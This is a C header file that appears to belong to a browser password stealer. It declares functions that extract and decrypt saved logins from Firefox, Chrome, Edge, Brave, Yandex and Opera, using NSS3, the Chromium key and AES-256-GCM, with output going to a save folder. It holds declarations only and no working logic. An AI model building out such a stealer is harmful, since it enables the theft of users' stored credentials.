#ifndef BROWSERS_H
#define BROWSERS_H
#define WINDOWS_TO_UNIX_EPOCH_DIFF 11644473600LL
#define SECONDS_IN_A_DAY 86400
#define SECONDS_IN_AN_HOUR 3600
#define SECONDS_IN_A_MINUTE 60

#include "global.h"
#include <stdio.h>
// typedefs for winsqlite3.dll
typedef struct sqlite3 sqlite3;
typedef struct sqlite3_stmt sqlite3_stmt;
typedef int (*sqlite3_openFunc)(const char *filename, sqlite3 **ppDb);
typedef int (*sqlite3_prepare_v2Func)(sqlite3 *db, const char *zSql, int nByte, sqlite3_stmt **ppStmt, const char **pzTail);
typedef int (*sqlite3_stepFunc)(sqlite3_stmt *pStmt);
typedef const unsigned char* (*sqlite3_column_textFunc)(sqlite3_stmt *pStmt, int iCol);
typedef int (*sqlite3_column_intFunc)(sqlite3_stmt *pStmt, int iCol);
typedef int (*sqlite3_finalizeFunc)(sqlite3_stmt *pStmt);
typedef int (*sqlite3_closeFunc)(sqlite3 *db);
typedef const void* (*sqlite3_column_blobFunc)(sqlite3_stmt*, int iCol);
typedef int (*sqlite3_column_bytesFunc)(sqlite3_stmt*, int iCol);
#define SQLITE_DONE 101
#define SQLITE_ROW 100


// Function defs.
int Firefox(char* folder_where_to_save_data, char* current_username);
int Chrome(char* folder_where_to_save_data, char* current_username);
void Edge(char* folder_where_to_save_data, char* current_username);
void Brave(char* folder_where_to_save_data, char* current_username);
void Yandex(char* folder_where_to_save_data, char* current_username);
void Opera(char* folder_where_to_save_data, char* current_username);
int ManualGeckoRegex(char *jsonload, char *hostname, char *username, char *password);
int Decrypt_NSS3(char *profile_path, char *crypted, char **outcrypt);
int ChromiumBasedKey(char *CLS_Path, char *key_location);
int ChromiumBasedDecryptionV10(char *logindata, char *storage, char *key, char *sqlite_query, int type);
int GeckoBasedDecryption(char *NSS3_PATH, char *logins_json, char *passwords_storage, int type);
int AES_256_GCM_Setup(char *key, char *CipherPass, int CipherPassSize, char *plaintext);
char *chrome_timestamp_to_string(const char *chrome_timestamp_str);
char *firefox_timestamp_to_string(const char *firefox_timestamp_str);
#endif
